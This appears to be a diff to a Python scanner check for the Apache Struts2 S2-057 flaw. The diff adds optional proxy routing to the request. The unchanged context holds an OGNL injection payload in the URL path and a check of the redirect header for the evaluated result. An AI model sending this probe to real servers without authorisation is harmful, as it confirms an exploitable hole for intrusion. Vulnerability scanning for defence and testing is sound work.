@@ -19,7 +19,7 @@ def UrlProcessing(url):
 payload='''/struts2-showcase/$%7B233*233%7D/actionChain1.action'''
 
 
-def S2_057(Url,RandomAgent):
+def S2_057(Url,RandomAgent,ProxyIp):
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
         port = 443
@@ -41,7 +41,14 @@ def S2_057(Url,RandomAgent):
     }
     s = requests.session()
     try:
-        resp = s.get(payload_url,headers=headers, timeout=5,allow_redirects=False)
+        if ProxyIp != None:
+            proxies = {
+                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+                "http": "http://" + str(ProxyIp)
+            }
+            resp = s.get(payload_url, headers=headers, proxies=proxies,timeout=5, allow_redirects=False)
+        elif ProxyIp == None:
+            resp = s.get(payload_url,headers=headers, timeout=5,allow_redirects=False)
         con = resp.headers['Location']
         code = resp.status_code
         if code==302 and con.lower().find('54289')!=-1:
